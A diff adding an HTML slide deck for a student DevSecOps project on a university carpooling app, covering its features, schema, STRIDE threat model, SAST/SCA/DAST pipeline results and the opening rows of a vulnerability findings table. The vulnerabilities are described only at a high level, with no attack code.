@@ -1,0 +1,1241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+  <title>UniRide — DevSecOps Pipeline</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css">
+  <link href="https://api.fontshare.com/v2/css?f[]=satoshi@900,700,400&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
+  <style>
+
+    /* ── Base — CREAM default ───────────────────────────────────────── */
+    .reveal-viewport {
+      background: #f5ead6 !important;
+    }
+    .reveal .slides section {
+      background: none !important;
+      font-family: 'Satoshi', -apple-system, sans-serif;
+      top: 0 !important;
+    }
+    .reveal h1, .reveal h2, .reveal h3, .reveal h4 { text-transform: none; }
+
+    /* ── Slide wrapper ──────────────────────────────────────────────── */
+    .s {
+      width: 1600px;
+      height: 900px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      box-sizing: border-box;
+      padding: 80px 160px;
+    }
+    .s.tight { padding: 52px 100px; }
+
+    /* ── Ambient glow ───────────────────────────────────────────────── */
+    .glow {
+      position: absolute; top: 50%; left: 50%;
+      width: 1000px; height: 700px;
+      background: radial-gradient(ellipse, rgba(20,64,168,0.05) 0%, transparent 65%);
+      transform: translate(-50%,-50%);
+      pointer-events: none; z-index: -1;
+    }
+    .glow.red {
+      background: radial-gradient(ellipse, rgba(200,30,30,0.12) 0%, transparent 65%);
+    }
+
+    /* ── Typography — cream-bg: BLUE text ───────────────────────────── */
+    .eyebrow {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      letter-spacing: 0.3em;
+      text-transform: uppercase;
+      color: rgba(20,64,168,0.50);
+      margin-bottom: 34px;
+      opacity: 0;
+    }
+
+    .t1 { font-size: 130px; font-weight: 900; letter-spacing: -0.045em; line-height: 1;   color: #1440a8; margin-bottom: 28px; opacity: 0; }
+    .t2 { font-size: 90px;  font-weight: 900; letter-spacing: -0.04em;  line-height: 1;   color: #1440a8; margin-bottom: 26px; opacity: 0; }
+    .t3 { font-size: 66px;  font-weight: 900; letter-spacing: -0.03em;  line-height: 1.1; color: #1440a8; margin-bottom: 22px; opacity: 0; }
+
+    .rule {
+      width: 48px; height: 1.5px;
+      background: linear-gradient(90deg, #1440a8, rgba(20,64,168,0.25));
+      border-radius: 2px;
+      margin-bottom: 28px;
+      transform-origin: center;
+      opacity: 0;
+    }
+
+    .tagline {
+      font-size: 22px;
+      font-weight: 400;
+      color: rgba(20,64,168,0.80);
+      max-width: 880px;
+      text-align: center;
+      line-height: 1.65;
+      margin-bottom: 52px;
+      opacity: 0;
+    }
+
+    .meta {
+      font-size: 17px;
+      color: rgba(20,64,168,0.58);
+      letter-spacing: 0.04em;
+      line-height: 2;
+      text-align: center;
+      opacity: 0;
+    }
+    .meta strong { color: #1440a8; font-weight: 500; }
+
+    /* ── Cards — cream-bg ───────────────────────────────────────────── */
+    .grid {
+      display: grid;
+      gap: 14px;
+      width: 100%;
+      max-width: 1360px;
+      opacity: 0;
+    }
+    .g2 { grid-template-columns: 1fr 1fr; }
+    .g3 { grid-template-columns: 1fr 1fr 1fr; }
+    .g4 { grid-template-columns: 1fr 1fr 1fr 1fr; }
+
+    .card {
+      background: rgba(20,64,168,0.05);
+      border: 1px solid rgba(20,64,168,0.14);
+      padding: 26px 28px;
+      border-radius: 10px;
+      text-align: left;
+    }
+    .card .lbl {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: rgba(20,64,168,0.48);
+      text-transform: uppercase;
+      letter-spacing: 0.16em;
+      margin-bottom: 10px;
+    }
+    .card .val {
+      font-size: 17px;
+      font-weight: 700;
+      color: #1440a8;
+      line-height: 1.35;
+    }
+    .card .sub {
+      font-size: 13px;
+      font-weight: 400;
+      color: rgba(20,64,168,0.72);
+      margin-top: 6px;
+      line-height: 1.55;
+    }
+
+    /* accent variants */
+    .card.cy { border-left: 2px solid rgba(20,64,168,0.55); }
+    .card.bl { border-left: 2px solid #1440a8; }
+    .card.re { border-left: 2px solid #cc2200; }
+    .card.gr { border-left: 2px solid #0a6040; }
+
+    /* ── Two-column layout ──────────────────────────────────────────── */
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 48px;
+      width: 100%;
+      max-width: 1360px;
+      align-items: start;
+      opacity: 0;
+    }
+    .row.wide { grid-template-columns: 3fr 2fr; }
+
+    /* ── Screenshot placeholder ─────────────────────────────────────── */
+    .shot {
+      border: 1px solid rgba(20,64,168,0.18);
+      border-radius: 8px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: rgba(20,64,168,0.25);
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+    }
+    .shot .hint {
+      font-size: 9px;
+      color: rgba(20,64,168,0.16);
+      letter-spacing: 0.12em;
+    }
+
+    /* ── Code block — cream-bg ──────────────────────────────────────── */
+    .code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: rgba(20,64,168,0.88);
+      background: rgba(20,64,168,0.07);
+      border: 1px solid rgba(20,64,168,0.16);
+      border-left: 2px solid #1440a8;
+      padding: 22px 26px;
+      text-align: left;
+      line-height: 1.9;
+      border-radius: 0 8px 8px 0;
+      width: 100%;
+      box-sizing: border-box;
+      white-space: pre;
+    }
+    .code .hi  { color: #cc2200; }
+    .code .ok  { color: #0a6040; }
+    .code .dim { color: rgba(20,64,168,0.38); }
+
+    /* ── Steps ──────────────────────────────────────────────────────── */
+    .steps {
+      list-style: none; padding: 0; margin: 0;
+      width: 100%; text-align: left;
+    }
+    .steps li {
+      display: flex; gap: 16px; padding: 11px 0;
+      font-size: 15px; color: rgba(20,64,168,0.80);
+      border-bottom: 1px solid rgba(20,64,168,0.10);
+      align-items: flex-start; line-height: 1.5;
+    }
+    .steps li:last-child { border-bottom: none; }
+    .steps li .n {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px; color: #1440a8;
+      flex-shrink: 0; padding-top: 3px;
+    }
+
+    /* ── Table ──────────────────────────────────────────────────────── */
+    .tbl {
+      width: 100%; border-collapse: collapse;
+      max-width: 1360px; opacity: 0;
+    }
+    .tbl th {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px; letter-spacing: 0.14em;
+      text-transform: uppercase; color: rgba(20,64,168,0.48);
+      padding: 8px 14px;
+      border-bottom: 1px solid rgba(20,64,168,0.18);
+      text-align: left; font-weight: 400;
+    }
+    .tbl td {
+      padding: 9px 14px;
+      border-bottom: 1px solid rgba(20,64,168,0.09);
+      font-size: 13px; color: rgba(20,64,168,0.76);
+      vertical-align: middle; line-height: 1.45;
+    }
+    .tbl tr:last-child td { border-bottom: none; }
+    .tbl td.m  { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: rgba(20,64,168,0.48); }
+    .tbl td.hi { color: #1440a8; }
+    .tbl td.re { color: #cc2200; font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+    .tbl td.cy { color: #1440a8; font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+    .tbl td.gr { color: #0a6040; font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+
+    /* ── Large-card modifier ────────────────────────────────────────── */
+    .grid.lg .card .lbl { font-size: 12px; }
+    .grid.lg .card .val { font-size: 20px; }
+    .grid.lg .card .sub { font-size: 15px; line-height: 1.6; }
+
+    /* ── Animations ─────────────────────────────────────────────────── */
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes growIn {
+      from { opacity: 0; transform: scaleX(0); }
+      to   { opacity: 1; transform: scaleX(1); }
+    }
+
+    .reveal .present .eyebrow { animation: fadeUp  0.6s  cubic-bezier(0.16,1,0.3,1) 0.10s both; }
+    .reveal .present .t1      { animation: fadeUp  0.7s  cubic-bezier(0.16,1,0.3,1) 0.28s both; }
+    .reveal .present .t2      { animation: fadeUp  0.7s  cubic-bezier(0.16,1,0.3,1) 0.28s both; }
+    .reveal .present .t3      { animation: fadeUp  0.7s  cubic-bezier(0.16,1,0.3,1) 0.28s both; }
+    .reveal .present .rule    { animation: growIn  0.45s cubic-bezier(0.16,1,0.3,1) 0.72s both; }
+    .reveal .present .tagline { animation: fadeUp  0.6s  cubic-bezier(0.16,1,0.3,1) 0.92s both; }
+    .reveal .present .meta    { animation: fadeUp  0.6s  cubic-bezier(0.16,1,0.3,1) 1.18s both; }
+    .reveal .present .grid    { animation: fadeUp  0.7s  cubic-bezier(0.16,1,0.3,1) 0.88s both; }
+    .reveal .present .row     { animation: fadeUp  0.7s  cubic-bezier(0.16,1,0.3,1) 0.88s both; }
+    .reveal .present .tbl     { animation: fadeUp  0.7s  cubic-bezier(0.16,1,0.3,1) 0.88s both; }
+
+    /* ── Nav chrome ─────────────────────────────────────────────────── */
+    .reveal .controls { color: rgba(20,64,168,0.55) !important; }
+    .reveal .progress { position: fixed !important; width: 100% !important; height: 5px !important; bottom: 0 !important; left: 0 !important; background: rgba(20,64,168,0.18) !important; border-radius: 9999px !important; }
+    .reveal .progress span { display: block !important; height: 100% !important; background: #1440a8 !important; border-radius: 9999px !important; }
+
+    /* ══════════════════════════════════════════════════════════════════
+       BLUE SLIDE OVERRIDES — section.blue-slide: cream text on blue bg
+       ════════════════════════════════════════════════════════════════ */
+    .blue-slide .eyebrow { color: rgba(245,234,214,0.55); }
+    .blue-slide .t1, .blue-slide .t2, .blue-slide .t3 { color: #f5ead6; }
+    .blue-slide .rule { background: linear-gradient(90deg, #f5ead6, rgba(245,234,214,0.28)); }
+    .blue-slide .tagline { color: rgba(245,234,214,0.80); }
+    .blue-slide .meta { color: rgba(245,234,214,0.58); }
+    .blue-slide .meta strong { color: #f5ead6; }
+    .blue-slide .card { background: rgba(255,255,255,0.08); border-color: rgba(245,234,214,0.18); }
+    .blue-slide .card .lbl { color: rgba(245,234,214,0.50); }
+    .blue-slide .card .val { color: #f5ead6; }
+    .blue-slide .card .sub { color: rgba(245,234,214,0.72); }
+    .blue-slide .card.re { border-left: 2px solid #ff8080; }
+    .blue-slide .card.gr { border-left: 2px solid #66ffcc; }
+    .blue-slide .shot { border-color: rgba(245,234,214,0.18); color: rgba(245,234,214,0.28); }
+    .blue-slide .shot .hint { color: rgba(245,234,214,0.18); }
+    .blue-slide .code { color: rgba(245,234,214,0.88); background: rgba(0,0,0,0.20); border-color: rgba(245,234,214,0.15); border-left-color: rgba(245,234,214,0.65); }
+    .blue-slide .code .hi { color: #ff8080; }
+    .blue-slide .code .ok { color: #66ffcc; }
+    .blue-slide .code .dim { color: rgba(245,234,214,0.38); }
+    .blue-slide .steps li { color: rgba(245,234,214,0.80); border-bottom-color: rgba(245,234,214,0.10); }
+    .blue-slide .steps li .n { color: #f5ead6; }
+    .blue-slide .tbl th { color: rgba(245,234,214,0.50); border-bottom-color: rgba(245,234,214,0.18); }
+    .blue-slide .tbl td { color: rgba(245,234,214,0.76); border-bottom-color: rgba(245,234,214,0.09); }
+    .blue-slide .tbl td.m { color: rgba(245,234,214,0.48); }
+    .blue-slide .tbl td.hi { color: #f5ead6; }
+    .blue-slide .tbl td.re { color: #ff8080; }
+    .blue-slide .tbl td.cy { color: #f5ead6; }
+    .blue-slide .tbl td.gr { color: #66ffcc; }
+
+  </style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+
+<!-- ═══════════════════════════════════════ 01 · TITLE ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="glow"></div>
+    <div class="eyebrow">Habib University &nbsp;·&nbsp; Cybersecurity &nbsp;·&nbsp; Semester 8</div>
+    <div class="t1">UniRide</div>
+    <div class="rule"></div>
+    <div class="tagline">A scalable carpooling platform — built, broken, and secured.</div>
+    <div class="meta">
+      <strong>Muhammad Shayaan &nbsp;·&nbsp; Muhammad Hayyan Khan &nbsp;·&nbsp; Muhammad Wajeeh Haider &nbsp;·&nbsp; Ikhlas Ahmed</strong><br>
+      May 2026
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 02 · THE PROBLEM ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="eyebrow">The Problem</div>
+    <div class="t2">Getting Around Karachi</div>
+    <div class="rule"></div>
+    <div class="tagline">Habib University students face long commutes, unreliable public transport, and real safety concerns every day.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">Challenge 01</div>
+        <div class="val">Long Commutes</div>
+        <div class="sub">Students travel from across the city with no reliable fast route to campus.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Challenge 02</div>
+        <div class="val">Unreliable Transport</div>
+        <div class="sub">Public transit is inconsistent. Private transport is expensive. Ride-hailing is not always safe.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Challenge 03</div>
+        <div class="val">Safety Concerns</div>
+        <div class="sub">Travelling alone or with strangers carries risk. A university-scoped platform reduces that surface.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 03 · INTRODUCTION ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="glow"></div>
+    <div class="eyebrow">The Solution</div>
+    <div class="t2">UniRide</div>
+    <div class="rule"></div>
+    <div class="tagline">A carpooling platform connecting drivers and passengers within the Habib University community — reducing costs, enhancing safety, and improving access to transport.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">Goal 01</div>
+        <div class="val">Reduce Costs</div>
+        <div class="sub">Shared rides split fuel and toll costs between driver and passengers on the same route.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Goal 02</div>
+        <div class="val">Enhance Safety</div>
+        <div class="sub">University email verification means every user is a known Habib student — not a stranger.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Goal 03</div>
+        <div class="val">Improve Access</div>
+        <div class="sub">Students without personal vehicles can reliably find rides with classmates going the same way.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 04 · FEATURES ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="eyebrow">Features</div>
+    <div class="t3">What It Does</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom:28px;">Authentication and role-based access control across three roles. Full driver and passenger workflows. Real-time messaging.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">Auth &amp; RBAC</div>
+        <div class="val">Identity &amp; Access</div>
+        <div class="sub">University email OTP registration. JWT sessions. Driver, Passenger, and Admin roles enforced on every endpoint.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Driver Side</div>
+        <div class="val">Ride Management</div>
+        <div class="sub">Create rides with origin, destination, seats, and price. Vehicle management. Accept or reject booking requests. Dashboard overview.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Passenger Side</div>
+        <div class="val">Search &amp; Book</div>
+        <div class="sub">Search rides by route. Request a seat with custom pickup and dropoff location. View upcoming and past ride history.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Messaging</div>
+        <div class="val">In-app Chat</div>
+        <div class="sub">Real-time SignalR messaging between driver and passengers on the same ride. One conversation per ride.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Non-functional</div>
+        <div class="val">Scale &amp; Performance</div>
+        <div class="sub">Supports 10–20 concurrent users. WebSocket-driven live updates. Dynamic content loading without full page refreshes.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Admin Panel</div>
+        <div class="val">Platform Control</div>
+        <div class="sub">View platform statistics. Manage all users and rides. Cancel active rides. Seeded on first run.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 05 · DATABASE ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s tight">
+    <div class="eyebrow">Database Design</div>
+    <div class="t3">Normalised SQLite Schema</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom:28px;">Eight entities. Entity Framework Core ORM. Relationships enforced via foreign keys and composite primary keys.</div>
+    <div class="grid g4">
+      <div class="card">
+        <div class="lbl">Users</div>
+        <div class="val">Core Identity</div>
+        <div class="sub">UserId · FullName · UniversityEmail · PasswordHash · PhoneNumber · CreatedAt</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Vehicles</div>
+        <div class="val">Driver Asset</div>
+        <div class="sub">VehicleId · Make · Model · NumberPlate · DriverId → Users</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Rides</div>
+        <div class="val">Core Entity</div>
+        <div class="sub">RideId · Origin · Destination · Status · Departure · AvailableSeats · PricePerSeat · DriverId · VehicleId</div>
+      </div>
+      <div class="card">
+        <div class="lbl">RideRequests</div>
+        <div class="val">Booking</div>
+        <div class="sub">PickupLocation · DropoffLocation · Status · PassengerId · RideId</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Passengers</div>
+        <div class="val">Role Table</div>
+        <div class="sub">UserId · composite key linking passenger profile to user account</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Conversation</div>
+        <div class="val">Chat Thread</div>
+        <div class="sub">ConversationId · linked to Messages and ConversationMembers</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Messages</div>
+        <div class="val">Chat Content</div>
+        <div class="sub">MessageId · Content · SentAt · SenderId → Users · ConversationId</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Conv. Members</div>
+        <div class="val">Participants</div>
+        <div class="sub">UserId + ConversationId as composite key linking users to conversations</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 06 · STACK ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="eyebrow">Foundation</div>
+    <div class="t2">The Stack</div>
+    <div class="rule"></div>
+    <div class="tagline">Client-server architecture with RESTful APIs. Component-based React frontend. .NET Core REST backend with Entity Framework.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">Backend</div>
+        <div class="val">ASP.NET Core</div>
+        <div class="sub">.NET 8 · C# · REST API</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Frontend</div>
+        <div class="val">React 19</div>
+        <div class="sub">Vite 6 · Axios · React Router v7</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Database</div>
+        <div class="val">SQLite</div>
+        <div class="sub">Entity Framework Core · EF Migrations</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Auth</div>
+        <div class="val">JWT HS256</div>
+        <div class="sub">6-hour expiry · RBAC · token blacklist</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Real-time</div>
+        <div class="val">SignalR</div>
+        <div class="sub">WebSocket · /hubs/chat</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Pipeline</div>
+        <div class="val">GitHub Actions</div>
+        <div class="sub">SAST + SCA + DAST on every push</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 07 · ARCHITECTURE ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s tight">
+    <div class="eyebrow">Architecture</div>
+    <div class="t3">System Architecture</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 28px;">Browser → API → Database. JWT for API access. Input validation at the boundary. HTTPS throughout.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">Frontend</div>
+        <div class="val">React with CSS</div>
+        <div class="sub">Responsive component-based UI. Vite dev proxy forwards API calls. Runs on HTTPS.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Backend</div>
+        <div class="val">.NET Core</div>
+        <div class="sub">RESTful API · Entity Framework · JWT auth middleware · SignalR hub · Swagger docs</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Database</div>
+        <div class="val">SQLite</div>
+        <div class="sub">Normalised schema · EF Core ORM · in-memory OTP store · local file persistence</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Security — Auth</div>
+        <div class="val">JWT for API Access</div>
+        <div class="sub">HS256 signed tokens. 6-hour expiry. Role claims on every request. Token blacklist on logout.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Security — Input</div>
+        <div class="val">Input Validation</div>
+        <div class="sub">Server-side validation on all endpoints. OTP verification before registration. Email format enforced.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Security — Transport</div>
+        <div class="val">HTTPS Encryption</div>
+        <div class="sub">TLS on both frontend and API. Dev cert via dotnet dev-certs. No plaintext HTTP in production paths.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · Architecture Diagram ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="glow"></div>
+    <div class="eyebrow">Architecture · System Diagram</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — ARCHITECTURE DIAGRAM
+        <div class="hint">docs/architecture/UniRide_Architecture_Diagram.png</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 08 · THREAT MODEL ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="eyebrow">Threat Model · STRIDE</div>
+    <div class="t3">Six Categories. Full Coverage.</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 28px;">Every component mapped to STRIDE. Attack surface defined before the pipeline ran a single scan.</div>
+    <div class="grid g3 lg">
+      <div class="card">
+        <div class="lbl">Spoofing</div>
+        <div class="val">JWT Forgery</div>
+        <div class="sub">Hardcoded weak secret. Any attacker with source access can mint tokens of any role.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Tampering</div>
+        <div class="val">SQL Injection</div>
+        <div class="sub">Unsanitised string concatenation inside a raw SQL query in the ride search endpoint.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Repudiation</div>
+        <div class="val">No Audit Logging</div>
+        <div class="sub">Zero server-side logging of authentication events, failed logins, or admin actions.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Information Disclosure</div>
+        <div class="val">IDOR + Stack Traces</div>
+        <div class="sub">Sequential user IDs with no ownership check. Full exceptions returned in 500 responses.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Denial of Service</div>
+        <div class="val">OTP Flood</div>
+        <div class="sub">No rate limit on /send-otp. Unlimited SMTP relay via the application server.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Elevation of Privilege</div>
+        <div class="val">Role Self-Assignment</div>
+        <div class="sub">Users self-select driver, passenger, or admin at login. No server-side enforcement.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 09 · PIPELINE ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="eyebrow">CI/CD · GitHub Actions</div>
+    <div class="t2">The Pipeline</div>
+    <div class="rule"></div>
+    <div class="tagline">Three security gates. Triggers on every push and pull request to main. Fails on any critical finding.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">SAST</div>
+        <div class="val">SonarCloud</div>
+        <div class="sub">Static analysis of C# and JavaScript source. Quality gate on security rating. Fails on Security Rating ≥ D.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">SCA</div>
+        <div class="val">OWASP Dependency-Check</div>
+        <div class="sub">NuGet and npm packages scanned against NVD CVE database. Fails on CVSS ≥ 7.0.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">DAST</div>
+        <div class="val">OWASP ZAP</div>
+        <div class="sub">Backend spun up in CI. JWT-authenticated full API scan against OpenAPI spec. 128 endpoints.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 10 · SAST ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="eyebrow">SAST · SonarCloud</div>
+    <div class="t3">Static Analysis</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 28px;">3 vulnerabilities · 2 security hotspots · 48 issues · Security rating B · Quality Gate: FAIL</div>
+    <div class="grid g4">
+      <div class="card re">
+        <div class="lbl">Minor · S8475 (×3)</div>
+        <div class="val">Unsanitized localStorage</div>
+        <div class="sub">Tainted JWT token data written to browser storage without sanitization — LoginPage.jsx lines 28–30</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Hotspot · Medium</div>
+        <div class="val">Container Root User</div>
+        <div class="sub">Dockerfile runs the application as root / containerAdministrator — elevated attack surface if container escapes</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Hotspot · Medium</div>
+        <div class="val">Recursive COPY</div>
+        <div class="sub">COPY . . in Dockerfile may inadvertently include secrets, credentials, or sensitive config files in the image</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Critical Smell · S2004</div>
+        <div class="val">Deep Function Nesting</div>
+        <div class="sub">Functions nested &gt;4 levels deep in ChatPage and DriverDashboard — high complexity, difficult to audit for logic flaws</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · SonarCloud ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="eyebrow">SAST · SonarCloud · Quality Gate</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — SONARCLOUD QUALITY GATE + SECURITY ISSUES PANEL
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 11 · SCA ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s tight">
+    <div class="eyebrow">SCA · OWASP Dependency-Check</div>
+    <div class="t3">45 CVEs Across 17 Packages</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 28px;">Maximum CVSS 10.0. Pipeline halted. Every npm and NuGet dependency scanned against the NVD.</div>
+    <div class="grid g4">
+      <div class="card">
+        <div class="lbl">CVSS 10.0</div>
+        <div class="val">vite</div>
+        <div class="sub">Critical RCE via server-side request forgery in dev server</div>
+      </div>
+      <div class="card">
+        <div class="lbl">CVSS 10.0</div>
+        <div class="val">rollup</div>
+        <div class="sub">Prototype pollution allowing arbitrary code execution</div>
+      </div>
+      <div class="card">
+        <div class="lbl">CVSS 9.8</div>
+        <div class="val">axios</div>
+        <div class="sub">CVE-2024-39338 — SSRF via protocol-relative URL</div>
+      </div>
+      <div class="card">
+        <div class="lbl">CVSS 7.5</div>
+        <div class="val">minimatch · form-data</div>
+        <div class="sub">ReDoS and multipart injection vulnerabilities</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · Dependency-Check ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="glow"></div>
+    <div class="eyebrow">SCA · OWASP Dependency-Check · Report</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — DEPENDENCY-CHECK HTML REPORT · PACKAGE TABLE
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 12 · DAST ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="eyebrow">DAST · OWASP ZAP</div>
+    <div class="t3">128 Endpoints Tested</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 28px;">Authenticated API scan via JWT. OpenAPI spec injected with server URL. 0 High · 0 Medium · 5 Low · 4 Informational.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">Low</div>
+        <div class="val">Application Error Disclosure</div>
+        <div class="sub">500 responses expose internal error messages that may reveal file paths or framework internals</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Low</div>
+        <div class="val">X-Content-Type-Options Missing</div>
+        <div class="sub">Header absent across all API responses — allows MIME-type sniffing attacks in older browsers</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Low</div>
+        <div class="val">CORP Header Missing</div>
+        <div class="sub">Cross-Origin-Resource-Policy not set — responses accessible from any cross-origin context</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · ZAP Report ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="eyebrow">DAST · OWASP ZAP · Alerts Summary</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — ZAP SCAN REPORT · ALERTS SUMMARY
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 13 · FINDINGS TABLE ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s tight">
+    <div class="eyebrow">Vulnerability Discovery</div>
+    <div class="t3">10 Findings</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 24px;">SAST, SCA, DAST, and manual pentesting. Mapped to OWASP Top 10 with CVSS v3.1 scores.</div>
+    <table class="tbl">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Vulnerability</th>
+          <th>OWASP</th>
+          <th>CVSS</th>
+          <th>Severity</th>
+          <th>Discovered By</th>
+          <th>Status</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="m">01</td><td class="hi">SQL Injection — Ride Search</td><td class="m">A03:2021</td><td class="m">9.8</td><td class="re">Critical</td><td class="m">SAST + Manual</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">02</td><td class="hi">Hardcoded JWT Secret</td><td class="m">A02:2021</td><td class="m">9.1</td><td class="re">Critical</td><td class="m">SAST + Manual</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">03</td><td class="hi">Vulnerable Dependencies (45 CVEs)</td><td class="m">A06:2021</td><td class="m">10.0</td><td class="re">Critical</td><td class="m">SCA</td><td class="gr">Fixed</td></tr>
